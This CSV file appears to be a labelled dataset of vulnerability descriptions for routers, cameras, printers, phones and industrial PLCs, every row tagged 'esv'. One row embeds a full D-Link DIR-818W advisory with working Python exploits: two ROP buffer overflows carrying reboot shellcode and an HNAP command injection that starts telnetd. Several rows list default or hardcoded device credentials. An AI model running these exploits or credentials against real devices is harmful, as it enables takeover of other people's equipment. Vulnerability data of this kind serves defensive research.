Description,Label
"Shenzhen Qianhai Huaxia Zhixin Data Technology Co., Ltd. is a leading R&D and manufacturer of smart parking smart terminal equipment in China. Shenzhen Qianhai Huaxia Zhixin Data Technology Co., Ltd. T83-CV102 entrance and exit license plate recognition high-definition network integrated camera has a weak password vulnerability. Attackers can use this vulnerability to obtain sensitive information.",esv
"Epson (China) Co., Ltd. is a company whose business includes printers, scanners, projectors and other information-related products business, electronic components business, and industrial automation equipment business. The Epson (China) Co., Ltd. L565 Series printer has an unauthorized access vulnerability. Attackers can use the vulnerability to access unauthorized access to obtain sensitive information and perform unauthorized operations.",esv
"Samsung Galaxy S10 is the flagship model of a new generation of smartphones launched by South Korea's Samsung. It is equipped with Qualcomm Snapdragon 855 processor and has a 6.1-inch screen. Samsung Galaxy S10 has an information disclosure vulnerability, which can be exploited by attackers to obtain sensitive information.",esv
"TP-LINK Technology Co., Ltd. (hereinafter referred to as ""TP-LINK"") is the world's leading supplier of network communication equipment. TP-LINK TD-8816 has a weak password vulnerability. Attackers can use this vulnerability to obtain sensitive information.",esv
"CSC830 PLC is a small controller of Beijing Sifang Relay Automation Co., Ltd. for small and medium discrete automation systems and independent automation systems. Beijing Sifang Relay Automation Co., Ltd. CSC-830 has an information disclosure vulnerability, which can be exploited by attackers to obtain sensitive information.",esv
"IP Camera is a network camera management software. The IP Camera of Zhejiang Dahua Technology Co., Ltd. has a weak password vulnerability. Attackers can use the vulnerability to obtain sensitive information.",esv
"TL-WR940N is a wireless router. TP-Link TL-WR940N has a denial of service vulnerability, which can be exploited by an attacker to cause a program to crash.",esv
"TP-Link AC1900 is a mini wireless router of China TP-Link. TP-Link AC1900 has a denial of service vulnerability, which can be exploited by an attacker to cause a denial of service.",esv
Schneider Electric Modicon TM218LDAE40DRPHN is a 24/16 PLC from Schneider. Schneider Electric Modicon TM218LDAE40DRPHN has a remote control vulnerability. An attacker could use the vulnerability to cause a program to crash by sending a large amount of junk data to the PLC 1105 port,esv
"D-Link DIR-882, DIR-878, DIR-867, DIR-853 are all D-Link wireless router products. Many D-Link routers have a logic flaw vulnerability, which can be exploited by an attacker to log in as an administrator.",esv
Amazon Ring Video Doorbell is a smart wireless home security doorbell camera that allows users to remotely control their doorbells. Amazon Ring Video Doorbell has a security vulnerability that originates from information shared between the application and the doorbell (including Wi-Fi passwords) transmitted over an unprotected HTTP connection. An attacker could use this vulnerability to obtain a user's Wi-Fi password .,esv
"D-Link DIR-635 is a wireless router from D-Link. The following security vulnerabilities exist in D-Link DIR-635: 1. HTML injection vulnerability 2. Cross-site request forgery vulnerability 3. Cross-site scripting vulnerability 4. Security bypass vulnerability. When a user browses an affected website, his browser will execute arbitrary code provided by the attacker, which may cause the attacker to steal cookie-based authentication, perform unauthorized operations in the context of the user session, or there may be other forms of attack. Other attacks are also possible",esv
"GX Work2 is a PLC programming software developed by Mitsubishi Electric Automation Co., Ltd., which is used for PLC design, debugging, and maintenance. It is widely used in power, machinery manufacturing, steel, petroleum, chemical and other industrial control fields. Mitsubishi Electric Corporation GX Works2 has a denial of service vulnerability, which can be exploited by attackers to cause a denial of service.",esv
D-Link DIR-300 is a D-Link wireless router product. The D-Link DIR-300 router contains files that contain vulnerabilities. Attackers can use the vulnerabilities to obtain sensitive information.,esv
"TP-LINK Technology Co., Ltd. (hereinafter referred to as ""TP-LINK"") is a supplier of network communication equipment. The TP-LINK Video Surveillance, Management and Storage Integrated Machine of Prolink Technology Co., Ltd. has a weak password vulnerability. Attackers use weak passwords to log in to the background to obtain sensitive information.",esv
NA300 PLC is a medium-sized programmable controller. NA300 PLC has a buffer overflow vulnerability. The vulnerability stems from et *** 's failure to properly handle functions. An attacker can overwrite the return address by constructing a variable length exceeding the variable v30,esv
"As a leading enterprise in China's information security industry, Beijing Top Rongxin Technology Co., Ltd. was established in 1995 and headquartered in Beijing. TOPSEC TAP series smart wireless AP devices have an unauthorized access vulnerability. Attackers can use this vulnerability to connect to the MQTT server anonymously and subscribe to arbitrary messages, causing information leakage.",esv
"HPPrintersWi-Fi is a WiFi direct-connect printer from Hewlett Packard (HP). An unauthorized access vulnerability exists in the HP WiFi Direct Connect printer, which also affects printers with the same model as public IP. An attacker can exploit the vulnerability to obtain printer network information, modify firewall configuration, and so on.",esv
Pelco Sarix Pro is a video surveillance device from Schneider Electric. A command injection vulnerability exists in the Schneider Pelco Sarix Pro camera set program system.opkg.remove. An attacker can use the vulnerability to execute arbitrary commands in the background through an HTTP request.,esv
D-Link DIR-816 is a wireless router. D-Link DIR-816 has a denial of service vulnerability. Attackers can use this vulnerability to cause the program to crash.,esv
"Ladder Editor is the upper computer programming software of GUTTA PLC system. Hitachi Industrial Machinery (China) Co., Ltd. Ladder Editor information disclosure vulnerability. Attackers can use vulnerabilities to obtain sensitive information.",esv
"Foscamcamera is a webcam that can push messages to mobile phones and directly implement video Baidu cloud storage via WIFI. There is a default credential vulnerability in the FoscamcameraWeb account. The Foscam camera device can access the web user interface using the default credentials with the username admin and password blank. In addition to gaining access to the device, attackers can upload and download files via the built-in FTP server and watch live video from the camera via the RTSP protocol.",esv
TL-XDR1850 is a wireless router. TP-Link TL-XDR1850 easy to show version has a denial of service vulnerability. Attackers can use the loopholes to send carefully constructed data packets (pointing to a specific destination address) to cause the target router and its upper carrier's router to cause a denial of service.,esv
D-LINK Central WifiManager CWM-100 is D-LINK centralized wireless management software. D-Link Central WiFiManager has a code execution vulnerability in its implementation. An attacker could use this vulnerability to gain control of a web server.,esv
"D-Link is an internationally renowned provider of network equipment and solutions, including a variety of router equipment. D-Link is a D-Link company dedicated to the research, development, production and marketing of local area networks, broadband networks, wireless networks, voice networks and related network equipment. A buffer overflow vulnerability exists in D-Link due to the program not performing correct boundary checks on user-submitted input. An attacker could use this vulnerability to execute arbitrary code in the context of an affected device and may also cause a denial of service. The following products are affected: D-Link Ethernet Broadband Router. ## Advisory Information Title: DIR-818W Buffer overflows and Command injection in authentication and HNAP functionalities Vendors contacted: William Brown <william.brown@dlink.com>, Patrick Cline patrick.cline@dlink.com(Dlink) CVE: None Note: All these security issues have been discussed with the vendor and vendor indicated that they have fixed issues as per the email communication. The vendor had also released the information on their security advisory pages http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10060, http://securityadvisories.dlink.com/security/publication.aspx?name=SAP10061 However, the vendor has taken now the security advisory pages down and hence the information needs to be publicly accessible so that users using these devices can update the router firmwares.The author (Samuel Huntley) releasing this finding is not responsible for anyone using this information for malicious purposes. ## Product Description DIR-818W -- Wireless AC750 Dual Band Gigabit Cloud Router. Mainly used by home and small offices. ## Vulnerabilities Summary Have come across 3 security issues in DIR-818W firmware which allows an attacker to exploit command injection and buffer overflows in authentication adn HNAP functionality. All of them can be exploited by an unauthentictaed attacker. The attacker can be on wireless LAN or WAN if mgmt interface is exposed to attack directly or using XSRF if not exposed. ## Details Buffer overflow in auth ---------------------------------------------------------------------------------------------------------------------- import socket import struct #Reboot shellcode in there ''' 2096 after id GET param, you can control the RA ''' buf = ""GET /dws/api/Login?id="" buf+=""A""*2064+""AAAA"" #S0 # uclibc system address buf+=""\x2A\xAF\xD0\x84"" #S1 -- ROP2 (Pulls Sleep address from S2 which is also stored there before, loads SP+36 is filled in RA with ROP3 and calls Sleep) buf+=""\x2A\xB1\x4D\xF0"" #S2 -- points to Sleep in library buf+=""\x2A\xB1\x4D\xF0"" #JUNK S3 buf+=""\x2A\xB1\x4D\xF0"" #JUNK S4 buf+=""\x2A\xB1\x4D\xF0"" #JUNK S5 buf+=""\x2A\xB0\xDE\x54"" # S6 filled up with pointer to ROP4 which is ultimate mission buf+=""\x2A\xB1\x4D\xF0"" #JUNK S7 buf+=""\x2A\xAC\xAD\x70"" # RETN address -- ROP1 (fills a0 with 3 for sleep and s1 is filled before with ROP2 address which is called) buf+=""C""*36 # buf+=""\x2A\xAC\xD5\xB4"" # ROP3 (Fills in S4 the address of SP+16 and then jumps to ROP4 which calls SP+16 stored in S4) buf+=""E""*16 buf+=""\x3c\x06\x43\x21\x34\xc6\xfe\xdc\x3c\x05\x28\x12\x34\xa5\x19\x69\x3c\x04\xfe\xe1\x34\x84\xde\xad\x24\x02\x0f\xf8\x01\x01\x01\x0c"" #Reboot shellcode Big endian buf+=""Y""*120 buf+=""&password=A HTTP/1.1\r\nHOST: 192.168.1.8\r\nUser-Agent: test\r\nAccept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nConnection:keep-alive\r\nContent-Length:5000\r\n\r\nid=""+""A""*5000+""\r\n\r\n"" print ""[+] sending buffer size"", len(buf) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((""10.0.0.90"", 80)) s.send(buf) ---------------------------------------------------------------------------------------------------------------------- Buffer overflow in HNAP ---------------------------------------------------------------------------------------------------------------------- import socket import struct ''' 548 characters after SOapaction:http://purenetworks.com/HNAP1/GetDeviceSettings/ should work, although sprintf copies twice so only 242 characters are required including /var/run and /etc/templates/hnap which is concatenated with your string to create 548 characters ''' buf = ""POST /HNAP1/ HTTP/1.0\r\nHOST: 192.168.1.8\r\nUser-Agent: test\r\nContent-Length: 1\r\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX"" + "";sh;""+""B""*158 buf+=""\x2A\xAF\xD0\x84"" #S1 -- ROP2 (Pulls Sleep address from S2 which is also stored there before, loads SP+36 is filled in RA with ROP3 and calls Sleep) buf+=""\x2A\xB1\x4D\xF0"" #S2 -- points to Sleep in library buf+=""AAAA""+""AAAA""+""AAAA"" #s3,s4,s5 JUNK buf+=""\x2A\xB0\xDE\x54"" # S6 filled up with pointer to ROP4 which is ultimate mission buf+=""AAAA"" #s7 JUNK buf+=""\x2A\xAC\xAD\x70"" # RETN address -- ROP1 (fills a0 with 3 for sleep and s1 is filled before with ROP2 address which is called) buf+=""C""*36 buf+=""\x2A\xAC\xD5\xB4"" # ROP3 (Fills in S4 the address of SP+16 and then jumps to ROP4 which calls SP+16 stored in S4) buf+=""C""*16 buf+=""\x3c\x06\x43\x21\x34\xc6\xfe\xdc\x3c\x05\x28\x12\x34\xa5\x19\x69\x3c\x04\xfe\xe1\x34\x84\xde\xad\x24\x02\x0f\xf8\x01\x01\x01\x0c"" #Reboot shellcode Big endian buf+=""B""*28+""\r\n"" + ""1\r\n\r\n"" print ""[+] sending buffer size"", len(buf) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((""10.0.0.90"", 80)) s.send(buf) ---------------------------------------------------------------------------------------------------------------------- Command injection ---------------------------------------------------------------------------------------------------------------------- import socket import struct # CSRF or any other trickery, but probably only works when connected to network I suppose for v2.02 buf = ""POST /HNAP1/ HTTP/1.0\r\nHOST: 10.0.0.90\r\nUser-Agent: test\r\nContent-Length: 1\r\nSOAPAction:http://purenetworks.com/HNAP1/GetDeviceSettings/XX"" + ';telnetd -p 9090;\r\n' + ""1\r\n\r\n"" print ""[+] sending buffer size"", len(buf) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((""10.0.0.90"", 80)) s.send(buf) ---------------------------------------------------------------------------------------------------------------------- ## Report Timeline * April 26, 2015: Vulnerability found by Samuel Huntley and reported to William Brown and Patrick Cline. * July 17, 2015: Vulnerability was fixed by Dlink as per the email sent by the vendor * Nov 13, 2015: A public advisory is sent to security mailing lists. ## Credit This vulnerability was found by Samuel Huntley (samhuntley84@gmail.com)",esv
TASKalfa 2552ci is a printer of Kyocera Corporation. Kyocera Corporation TASKalfa 2552ci has an unauthorized access vulnerability. Attackers can use the vulnerability to obtain sensitive information.,esv
"D-LINK DWL-2000AP + is a popular wireless access router. DWL-2000AP + has a vulnerability in processing a large number of ARP requests, and remote attackers may use this vulnerability to cause the device to malfunction. D-LINK DWL-2000AP + did not properly handle the arp flood, resulting in two denial of service vulnerabilities. If an attacker can send a large number of arp replies at a high speed through a wired connection or broadcast, it will cause the wireless connection (802.11) to be reset and the arp table rebuilt, and all clients connected to the AP will be disconnected. The second vulnerability only affects wireless connections. If there are no other D-LINK Ethernet products in the AP range and wep encryption is enabled, an attacker can broadcast a large number of arp requests through a wireless connection at high speed, causing a denial of service. This attack works only 90% of the time, because APs can sometimes ban the client that sent the flood before completing the attack.",esv
"ZTE C520 is a smart Wi-Fi care camera. ZTE C520 smart camera has authentication flaws. The vulnerability is because the smart camera requires user name and password authentication to log in, view images and parameter settings. At the same time, authentication after login is based on IP, that is, as long as an IP is logged in with an account, the IP will automatically authorize access to the management background. Attackers can use the vulnerability to randomly call the management background and perform various operations.",esv
"Siemens SIMATIC S7 series PLC Used in various industrial fields, including energy, water conservancy, oil, natural gas, chemical, building automation, and manufacturing. Read and write users PLC Memory capacity is based on Siemens ISO-TSAP An integral part of the open architecture of the protocol allows Siemens and non-Siemens products to access programmable controller memory, input and output constants and variables. As a result, devices implementing the protocol have proven to be vulnerable.",esv
Cisco is the world's leading provider of network solutions. Cisco Wireless-G Internet Home Monitoring Camera has an unauthorized access vulnerability. Attackers can use vulnerabilities to obtain sensitive information.,esv
TP-Link TD-W89 Routers is a router device. TP-LINK TD-W89 is a router product of China TP-LINK company. An unauthorized access vulnerability exists in the TP-LINK TD-W89 router. An attacker could use this vulnerability to gain access to sensitive information,esv
"The official version of Yawcam (win7 camera software) is a camera capture. Yawcam (win7 camera software) easily helps users perform accurate live broadcasts outdoors, and the official version of Yawcam (win7 camera software) can also quickly intercept the played images. , And save it in a local file. Yawcam has an unauthorized access vulnerability, which can be exploited by attackers to obtain sensitive information.",esv
"Tenda AC11 is a wireless router that uses RTOS operating system. Shenzhen Jixiang Tengda Technology Co., Ltd. AC11 has a binary vulnerability, which can be exploited by attackers to cause a denial of service.",esv
"The Lexmark MX310dn printer is a product of Lexmark. Lexmark MX310dn has an unauthorized access vulnerability, which can be exploited by attackers to obtain sensitive information.",esv
"Shenzhen Zhongda Youkong Technology Co., Ltd. is a company that concentrates on industrial visual touch control products---Human-machine interface, text display, programmable logic controller (PLC) core technology research and development, professional development and sales. High-Tech Companies. There is a binary vulnerability in the TP220 PC screen setting tool of Zhongda Youkong. Attackers can use the vulnerability to cause a denial of service.",esv
"Siemens SIMATIC S7-300, 1200, 1500 CPU is a modular universal controller for the manufacturing industry of Siemens, Germany. It is widely used in important industrial control sites such as tobacco, petrochemical and water. A denial of service vulnerability exists in the Siemens SIMATIC S7-300/1200/1500 CPU. Since the Siemens S7-300, 1200, and 1500 CPUs refuse service when communicating with the ProfinetIO Layer 2 network packet of a specific configuration, the CPU enters the failure mode and needs to be manually restarted for recovery. The attacker exploits the vulnerability to directly obtain the target information through the secondary MAC broadcast to initiate a denial of service attack",esv
"Lexmark CS510de, Lexmark MS510dn, Lexmark MX510de, Lexmark MX310dn are a printer product of Lexmark. Lexmark CS510de, Lexmark MS510dn, Lexmark MX510de, and Lexmark MX310dn have unauthorized access vulnerabilities, which can be exploited by attackers to obtain sensitive information.",esv
Canon is a famous Canon printer manufacturer in Japan. An information disclosure vulnerability exists in Canon PIXMA MX722 Printer. The remote attacker is allowed to obtain the password information because the WPA2 password exposed by the device on the network is on the unprotected configuration page of the plaintext device. Canon PIXMA MX722 is prone to an information-disclosure vulnerability. Remote attackers can exploit this issue to gain access to sensitive information that may aid in further attacks. Canon PIXMA MX722 is vulnerable; other versions may also affected,esv
"The Samsung Galaxy S III is a popular smartphone from Samsung. The Samsung Galaxy S III document viewer has an unspecified error in processing certain files, and an attacker exploiting the vulnerability can trigger a memory corruption vulnerability. ---------------------------------------------------------------------- The final version of the CSI 6.0 has been released. Find out why this is not just another Patch Management solution: http://secunia.com/blog/325/ ---------------------------------------------------------------------- TITLE: Samsung Galaxy S III Two Vulnerabilities SECUNIA ADVISORY ID: SA50914 VERIFY ADVISORY: Secunia.com http://secunia.com/advisories/50914/ Customer Area (Credentials Required) https://ca.secunia.com/?page=viewadvisory&vuln_id=50914 RELEASE DATE: 2012-10-11 DISCUSS ADVISORY: http://secunia.com/advisories/50914/#comments AVAILABLE ON SITE AND IN CUSTOMER AREA: * Last Update * Popularity * Comments * Criticality Level * Impact * Where * Solution Status * Operating System / Software * CVE Reference(s) http://secunia.com/advisories/50914/ ONLY AVAILABLE IN CUSTOMER AREA: * Authentication Level * Report Reliability * Secunia PoC * Secunia Analysis * Systems Affected * Approve Distribution * Remediation Status * Secunia CVSS Score * CVSS https://ca.secunia.com/?page=viewadvisory&vuln_id=50914 ONLY AVAILABLE WITH SECUNIA CSI AND SECUNIA PSI: * AUTOMATED SCANNING http://secunia.com/vulnerability_scanning/personal/ http://secunia.com/vulnerability_scanning/corporate/wsus_sccm_3rd_third_party_patching/ DESCRIPTION: MWR InfoSecurity has reported two vulnerabilities in Samsung Galaxy S III, which can be exploited by malicious people to compromise a vulnerable device. Successful exploitation of this vulnerability requires that a malicious application is installed. Other Android versions may also be affected. SOLUTION: No official solution is currently available. PROVIDED AND/OR DISCOVERED BY: Tyrone Erasmus, Jon Butler, Jacques Louw, and Nils, MWR InfoSecurity. ORIGINAL ADVISORY: http://labs.mwrinfosecurity.com/blog/2012/09/19/mobile-pwn2own-at-eusecwest-2012/ OTHER REFERENCES: Further details available in Customer Area: http://secunia.com/vulnerability_intelligence/ DEEP LINKS: Further details available in Customer Area: http://secunia.com/vulnerability_intelligence/ EXTENDED DESCRIPTION: Further details available in Customer Area: http://secunia.com/vulnerability_intelligence/ EXTENDED SOLUTION: Further details available in Customer Area: http://secunia.com/vulnerability_intelligence/ EXPLOIT: Further details available in Customer Area: http://secunia.com/vulnerability_intelligence/ ---------------------------------------------------------------------- About: This Advisory was delivered by Secunia as a free service to help private users keeping their systems up to date against the latest vulnerabilities. Subscribe: http://secunia.com/advisories/secunia_security_advisories/ Definitions: (Criticality, Where etc.) http://secunia.com/advisories/about_secunia_advisories/ Please Note: Secunia recommends that you verify all advisories you receive by clicking the link. Secunia NEVER sends attached files with advisories. Secunia does not advise people to install third party patches, only use those supplied by the vendor. ---------------------------------------------------------------------- Unsubscribe: Secunia Security Advisories http://secunia.com/sec_adv_unsubscribe/?email=packet%40packetstormsecurity.org ----------------------------------------------------------------------",esv
"The D-Link DIR-615 is a router device. There are several security vulnerabilities in D-Link DIR-615: 1. There is a cross-site request forgery vulnerability that allows remote attackers to build malicious URIs, entice users to resolve, and perform malicious operations in the target user context, such as changing device configuration. 2. The application fails to properly restrict access to certain requests, allowing an attacker to exploit the vulnerability to obtain sensitive information. D-Link DIR-615 is a small wireless router product from D-Link. There are multiple security vulnerabilities in D-Link DIR-615 routers running 5.10 and earlier firmware, including: 1. Authentication bypass vulnerability 2. Cross-site request forgery vulnerability 3. HTML injection vulnerability 4. Information leakage vulnerability Attackers can use these vulnerabilities to execute HTML and arbitrary script code in the context of the affected device, steal cookie-based authentication, bypass authentication mechanisms, or obtain sensitive information. Other attacks are also possible",esv
"Axis is an IT company that specializes in providing network video solutions. It is the global market leader in network video, driving the transition from analog to digital video surveillance. Axis' monitoring products and solutions are based on an open and innovative technology platform, dedicated to security monitoring and remote monitoring. AXIS Q1755 Network Camera has an unauthorized access vulnerability, which can be exploited by attackers to obtain sensitive information.",esv
"TP-Link is a well-known supplier of network and communication equipment. TP-Link TD-W8901G, TD-W8101G, TD-8840G, TD-8817 firmware version 3.11.2.175_TC3086, T14.F7_5.0 There is a remote denial of service vulnerability, which can be exploited by an attacker to cause the affected device to crash. Multiple TP-Link routers are prone to a denial-of-service vulnerability. TP-Link TD-W8901G, TD-W8101G, TD-8840G, TD-8817 running firmware version 3.11.2.175_TC3086 and hardware version T14.F7_5.0 are vulnerable",esv
"X3220NR is a printer of Samsung (China) Investment Co., Ltd. Samsung (China) Investment Co., Ltd. X3220NR has an unauthorized access vulnerability, which can be exploited by attackers to obtain sensitive information.",esv
This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of D-Link DCS-960L Wi-Fi cameras. Authentication is not required to exploit this vulnerability.The specific flaw exists within the handling of the Cookie request header. The issue results from the lack of proper validation of a user-supplied string before using it as a format specifier. An attacker can leverage this vulnerability to execute code in the context of the device.,esv
Samsung Galaxy S3 is prone to a security-bypass vulnerability due to a failure to restrict access to locked devices. An attacker with physical access to a locked device can leverage this issue to bypass the lock screen and gain partial access to the device.,esv
"D-Link Electronic Equipment (Shanghai) Co., Ltd. is a company mainly engaged in network equipment, wireless equipment, switches and other projects. The DVA-2800 management platform and DSL-2888A management platform have logic flaws and vulnerabilities, which can be exploited by attackers to obtain sensitive information.",esv
"Shenzhen Woshida Technology Co., Ltd. is an enterprise specializing in the development, production, sales and service of security monitoring products. The WSD-T13 cloud storage camera (Android client) has an unauthorized access vulnerability. The vulnerability is caused by the server's weak check of the client's request data. An attacker could use the vulnerability to modify the login password of other accounts.",esv
"D-LinkDIR615/645/815 is a wireless router product from D-Link. A remote command execution vulnerability exists in D-Link DIR615/645/815 Router 1.03 and previous firmware versions. The vulnerability is caused by the splicing of the data in the HTTP POST request in service.cgi, causing the background commands to be spliced, resulting in arbitrary commands.",esv
"D-Link DWR-932B LET is a wireless router. D-Link DWR-932B LET router SSH service has a backdoor account vulnerability. Since D-Link wireless routers use two hard-coded secret accounts (admin:admin and root:1234) to run SSH services by default, attackers can use shell commands to perform man-in-the-middle attacks, monitor network traffic, and run malicious scripts to change router settings. .",esv
"233D is a network camera. Axis 233D Network Dome Camera has an unauthorized access vulnerability, which can be exploited by attackers to obtain sensitive information.",esv
"Samsung Mobile Phone is a smart phone released by Samsung in South Korea. A denial of service vulnerability exists in Samsung Mobile Phones. A remote attacker could use this vulnerability to cause a denial of service. The following versions are affected: Samsung Mobile Phones running Android 4.4, 5.0, 5.1, 6.0",esv
"Shenzhen Ruilian Digital Technology Co., Ltd. is committed to developing leading Internet video products and video content services, providing cameras for security, sports, entertainment, nursing and other subdivision applications for the consumer market, and providing live broadcast, video sharing and Content services such as video cloud storage. The Reolink camera has a remote command execution vulnerability and two unauthorized stack overflow vulnerabilities. An attacker could use a remote command execution vulnerability in conjunction with the default credentials admin: empty or weak passwords to bypass the authentication limit and remotely take over the camera.",esv
"Bluetooth U ensures the synchronization of file transfers between devices without restricting file types. The Bluetooth U v1.2.0 iOS mobile app (Apple iOS - iPad & iPhone) has multiple local directory traversal and file inclusion vulnerabilities. Bluetooth U is a set of Bluetooth connection software. The software supports file transfer, file sharing, local file management, and more. A directory traversal vulnerability exists in the New Folder-Index module in Bluetooth U, which stems from the program's insufficient filtering of user-submitted input. A remote attacker could exploit this vulnerability by using a request with a directory traversal sequence character to retrieve arbitrary local files in the application context. There are vulnerabilities in Bluetooth U 1.2.0, other versions may also be affected. Bluetooth U is prone to multiple directory-traversal vulnerabilities because it fails to sufficiently sanitize user-supplied input. Information obtained could aid in further attacks",esv
"TwidoSuite is a PLC programming software developed by Schneider Electric. Schneider-Electric TwidoSuite has a denial of service vulnerability. Attackers can use this vulnerability to send constructed malicious data packets, which can cause a denial of service.",esv
"Tianyi Kandian is a security service that integrates camera, video, real-time monitoring, PTZ control, alarm, and storage. Tianyi Kandian camera has an unauthorized access vulnerability, which can be exploited by attackers to obtain sensitive information.",esv
"HP LaserJet Pro M706n is a printer of Hewlett-Packard Trading (Shanghai) Co., Ltd. The HP LaserJet Pro M706n has an unauthorized access vulnerability, which can be exploited by attackers to obtain sensitive information.",esv
"Developineo+220, bizhub283, Developinoo363, bizhubC220, bizhubC353 are several printer products of Konica Minolta Group. There is an unauthorized access vulnerability in the Konica Minolta printer. An attacker exploits a vulnerability to gain unauthorized access to a website to obtain sensitive information.",esv
AutoThink is a professional PLC programming software for Hollysys le series. Hollysys Group AutoThink has a certification bypass vulnerability. Attackers can use the vulnerability to directly bypass the file opening password verification process by modifying the content of the library file.,esv
"Hollysys Group is a professional automation company integrating R & D, production, sales and technical services. Hollysys PLC FCS has a remote control vulnerability. An attacker can use this vulnerability to control the FCS arbitrarily by sending a constructed packet conforming to the private protocol",esv
This vulnerability allows network-adjacent attackers to bypass authentication on affected installations of D-Link DIR-2055 routers. Authentication is not required to exploit this vulnerability.The specific flaw exists within the handling of HNAP login requests. The issue results from the lack of proper handling of empty passwords. An attacker can leverage this vulnerability to execute arbitrary code on the router. D-Link DIR-2055 is a router device. D-Link DIR-2055 HNAP has a security vulnerability,esv
KGW3101 gateway products can realize the conversion between Modbus TCP and Modbus RTU / ASCII protocols. KGW3101 has a command execution vulnerability. An attacker could use this vulnerability to cause the KGW3101 device to execute arbitrary commands,esv
SIEMENS SIMATIC S7-400 is a modular universal controller of Siemens (Siemens) for the manufacturing industry. SIEMENS SIMATIC S7-400 has a denial of service vulnerability. An attacker can use this vulnerability to cause a denial of service,esv
"Zhejiang Dahua Technology Co., Ltd. is a leading monitoring product supplier and solution service provider. The camera of Zhejiang Dahua Technology Co., Ltd. has a logic flaw vulnerability, which can be exploited by attackers to obtain sensitive information.",esv
"D-Link Technology Co., Ltd. was established in 1986, focusing on the design and development of computer network equipment. D-Link DCS-4622 has an information disclosure vulnerability, which can be exploited by attackers to obtain sensitive information.",esv
"D-Link DIR-823G is a wireless router. D-Link DIR-823G has an unauthorized access vulnerability. The vulnerability does not control the path under the cgi-bin directory. Attackers can use the vulnerability to obtain device information, tamper with configuration information, and execute code.",esv
"TP-LINK Technology Co., Ltd. (hereinafter referred to as ""TP-LINK"") is the world's leading supplier of network communication equipment. The Archer C50 router has a weak password vulnerability, which can be exploited by attackers to obtain sensitive information.",esv
